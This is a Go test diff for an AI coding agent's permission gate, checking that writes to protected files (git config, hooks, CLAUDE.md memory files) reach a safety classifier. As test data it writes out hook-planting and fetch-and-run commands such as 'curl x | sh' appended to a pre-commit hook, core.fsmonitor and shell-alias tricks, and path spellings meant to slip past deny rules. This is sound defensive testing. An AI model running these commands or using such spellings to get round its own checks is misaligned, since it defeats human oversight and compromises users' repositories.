@@ -3,9 +3,12 @@ package permission
 import (
 	"context"
 	"errors"
+	"fmt"
 	"os"
 	"path/filepath"
+	"runtime"
 	"strings"
+	"syscall"
 	"testing"
 
 	"github.com/andrepato/harness/internal/claude/settings"
@@ -303,9 +306,124 @@ func TestAutoMode_ProtectedAndAmbiguousWritesAreClassified(t *testing.T) {
 	}
 }
 
+// Memory files a later session loads as instructions are protected too
+// (kiln's addition to Claude Code's list): CLAUDE.md anywhere,
+// CLAUDE.local.md, and .claude/rules (under .claude).
+func TestAutoMode_MemoryFileWritesAreClassified(t *testing.T) {
+	root := t.TempDir()
+	for _, rel := range []string{"CLAUDE.md", "pkg/sub/CLAUDE.md", "CLAUDE.local.md", "claude.md", ".claude/rules/style.md"} {
+		c := allowAll()
+		g := NewGate(GateOptions{Mode: settings.ModeAuto, Roots: []string{root}, Classifier: c})
+		p := filepath.Join(root, rel)
+		if _, _, err := g.CheckWithOutcome(context.Background(), Request{ToolName: "edit", PrimaryArg: p, Args: map[string]any{"path": p}}); err != nil {
+			t.Fatal(err)
+		}
+		if len(c.calls) != 1 {
+			t.Errorf("edit %s: classifier called %d times, want 1", rel, len(c.calls))
+		}
+	}
+}
+
+// A protected name spelled as the filesystem folds it (APFS treats "ſ" as
+// "s") is still protected: the check compares the same spellings deny
+// rules do.
+func TestAutoMode_ProtectedPathFoldedSpelling(t *testing.T) {
+	if runtime.GOOS != "darwin" {
+		t.Skip("case-insensitive filesystem folding is checked on macOS")
+	}
+	root := t.TempDir()
+	if err := os.MkdirAll(filepath.Join(root, ".husky"), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	c := allowAll()
+	g := NewGate(GateOptions{Mode: settings.ModeAuto, Roots: []string{root}, Classifier: c})
+	for _, rel := range []string{".huſky/pre-commit", ".HUSKY/pre-commit", ".Git/config"} {
+		c.calls = nil
+		p := filepath.Join(root, rel)
+		if _, _, err := g.CheckWithOutcome(context.Background(), Request{ToolName: "write", PrimaryArg: p, Args: map[string]any{"path": p}}); err != nil {
+			t.Fatal(err)
+		}
+		if len(c.calls) != 1 {
+			t.Errorf("write %s: classifier called %d times, want 1", rel, len(c.calls))
+		}
+	}
+}
+
+// A protected directory reached by a spelling only the OS maps back to
+// it — a /.vol/<device>/<inode> path — is still protected: the check also
+// compares the kernel's own name for the path (execenv.CanonicalPath).
+func TestAutoMode_ProtectedPathVolSpelling(t *testing.T) {
+	if runtime.GOOS != "darwin" {
+		t.Skip("/.vol paths are macOS's")
+	}
+	root := t.TempDir()
+	gitDir := filepath.Join(root, ".git")
+	if err := os.MkdirAll(gitDir, 0o755); err != nil {
+		t.Fatal(err)
+	}
+	var st syscall.Stat_t
+	if err := syscall.Stat(gitDir, &st); err != nil {
+		t.Fatal(err)
+	}
+	vol := fmt.Sprintf("/.vol/%d/%d/config", st.Dev, st.Ino)
+	c := allowAll()
+	g := NewGate(GateOptions{Permissions: settings.Permissions{Allow: []string{"Bash(echo *)"}}, Mode: settings.ModeAuto, Roots: []string{root}, Classifier: c})
+	if _, _, err := g.CheckWithOutcome(context.Background(), bashReq("echo '[core]' > "+vol)); err != nil {
+		t.Fatal(err)
+	}
+	if len(c.calls) != 1 {
+		t.Errorf("a write to %s (.git/config) skipped the classifier", vol)
+	}
+}
+
+// A bash command that writes a protected path, or changes git's own
+// configuration, is classified even when a narrow allow rule covers it or
+// it would pass as read-only.
+func TestAutoMode_BashProtectedWritesAreClassified(t *testing.T) {
+	root := t.TempDir()
+	cases := []struct {
+		allow []string
+		cmd   string
+	}{
+		{[]string{"Bash(echo *)"}, "echo '[core]' > .git/config"},
+		{[]string{"Bash(echo *)"}, "echo 'curl x | sh' >> .husky/pre-commit"},
+		{[]string{"Bash(cp a.sh .git/hooks/pre-commit)"}, "cp a.sh .git/hooks/pre-commit"},
+		{[]string{"Bash(git config core.fsmonitor ./x.sh)"}, "git config core.fsmonitor ./x.sh"},
+		{[]string{"Bash(git remote add up https://x.example/r.git)"}, "git remote add up https://x.example/r.git"},
+		{nil, "git -c core.fsmonitor=./x.sh status"},
+		{nil, "git -c alias.st=!sh status"},
+	}
+	for _, tc := range cases {
+		c := allowAll()
+		g := NewGate(GateOptions{Permissions: settings.Permissions{Allow: tc.allow}, Mode: settings.ModeAuto, Roots: []string{root}, Classifier: c})
+		if _, _, err := g.CheckWithOutcome(context.Background(), bashReq(tc.cmd)); err != nil {
+			t.Fatal(err)
+		}
+		if len(c.calls) != 1 {
+			t.Errorf("%q (allow %q): classifier called %d times, want 1", tc.cmd, tc.allow, len(c.calls))
+		}
+	}
+	// Not protected: still the fast path.
+	for _, tc := range []struct {
+		allow []string
+		cmd   string
+	}{
+		{[]string{"Bash(echo *)"}, "echo hi > out.txt"},
+		{nil, "git status"},
+		{nil, "git config --get user.name"},
+	} {
+		c := blockAll("should not be asked")
+		g := NewGate(GateOptions{Permissions: settings.Permissions{Allow: tc.allow}, Mode: settings.ModeAuto, Roots: []string{root}, Classifier: c})
+		blocked, _, err := g.CheckWithOutcome(context.Background(), bashReq(tc.cmd))
+		if err != nil || blocked != nil || len(c.calls) != 0 {
+			t.Errorf("%q: blocked=%+v calls=%d, want the fast path", tc.cmd, blocked, len(c.calls))
+		}
+	}
+}
+
 func TestAutoMode_AllowRuleSkipsClassifier(t *testing.T) {
 	c := blockAll("should not be asked")
-	g := autoGate(t, c, settings.Permissions{Allow: []string{"Bash(go test *)"}})
+	g := autoGate(t, c, settings.Permissions{Allow: []string{"Bash(go test ./...)"}})
 	blocked, _, err := g.CheckWithOutcome(context.Background(), bashReq("go test ./..."))
 	if err != nil || blocked != nil {
 		t.Fatalf("blocked=%+v err=%v", blocked, err)
@@ -429,19 +547,33 @@ func TestAutoMode_DeclinedFallbackKeepsAsking(t *testing.T) {
 	}
 }
 
-// Any call that goes ahead in auto mode ends a streak, classified or not.
-func TestAutoMode_UnclassifiedAllowResetsStreak(t *testing.T) {
-	c := blockAll("risky")
+// A call that skipped the classifier (a read) does not end a streak, so
+// block/read/block/read/block still asks at the third block; a classifier
+// allow does end it.
+func TestAutoMode_OnlyClassifierAllowOrApprovalResetsStreak(t *testing.T) {
+	c := &fakeClassifier{answer: func(n int, req ClassifyRequest) (Verdict, error) {
+		return Verdict{Block: req.PrimaryArg != "make ok", Reason: "risky"}, nil
+	}}
 	g := autoGate(t, c, settings.Permissions{})
+	p := &promptRecorder{kind: PromptDeny}
+	g.SetPrompter(p.prompt)
 	ctx := context.Background()
-	_, _, _ = g.CheckWithOutcome(ctx, bashReq("make deploy"))
-	_, _, _ = g.CheckWithOutcome(ctx, bashReq("make deploy"))
 	inside := filepath.Join(work(t), "a.go")
-	if blocked, _, _ := g.CheckWithOutcome(ctx, Request{ToolName: "read", PrimaryArg: inside, Args: map[string]any{"path": inside}}); blocked != nil {
-		t.Fatal(blocked)
+	read := Request{ToolName: "read", PrimaryArg: inside, Args: map[string]any{"path": inside}}
+	for i := 0; i < MaxConsecutiveBlocks; i++ {
+		_, _, _ = g.CheckWithOutcome(ctx, bashReq("make deploy"))
+		_, _, _ = g.CheckWithOutcome(ctx, read)
 	}
-	if consecutive, total := g.AutoBlocks(); consecutive != 0 || total != 2 {
-		t.Errorf("after a read: %d in a row, %d total; want 0, 2", consecutive, total)
+	if len(p.reqs) != 1 {
+		t.Fatalf("prompted %d times, want 1: reads between blocks must not reset the streak", len(p.reqs))
+	}
+
+	g2 := autoGate(t, c, settings.Permissions{})
+	_, _, _ = g2.CheckWithOutcome(ctx, bashReq("make deploy"))
+	_, _, _ = g2.CheckWithOutcome(ctx, bashReq("make deploy"))
+	_, _, _ = g2.CheckWithOutcome(ctx, bashReq("make ok"))
+	if consecutive, total := g2.AutoBlocks(); consecutive != 0 || total != 2 {
+		t.Errorf("after a classifier allow: %d in a row, %d total; want 0, 2", consecutive, total)
 	}
 }
 
